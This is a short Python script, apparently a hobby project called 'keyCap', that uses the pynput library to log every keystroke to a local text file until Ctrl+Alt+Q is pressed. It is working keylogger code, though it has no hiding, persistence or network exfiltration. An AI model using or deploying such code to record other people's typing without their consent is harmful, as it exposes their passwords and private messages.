#keyCap v0.3 . ArbazStark
from pynput.keyboard import Key, Listener, KeyCode
import os

# Getting the current directory where the script is located
current_directory = os.path.dirname(os.path.abspath(__file__))

# Setting the log file path to the current directory
log_file_path = os.path.join(current_directory, "keylogs.txt")

# creating variable to check for the key combination to stop the listener
current_keys = set()

# create the key combination to stop the listener
STOP_COMBINATION = {Key.ctrl_l, Key.alt_l, KeyCode.from_char('q')}

# Function to write logs to the file and check for the stop combination
def on_press(key):
    with open(log_file_path, "a") as f:
        f.write(str(key) + "\n")

    if key in STOP_COMBINATION:
        current_keys.add(key)
        if all(k in current_keys for k in STOP_COMBINATION):
            return False

# Function to remove released keys from the set
def on_release(key):
    try:
        current_keys.remove(key)
    except KeyError:
        pass

# Setup the listener with on_press and on_release functions
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

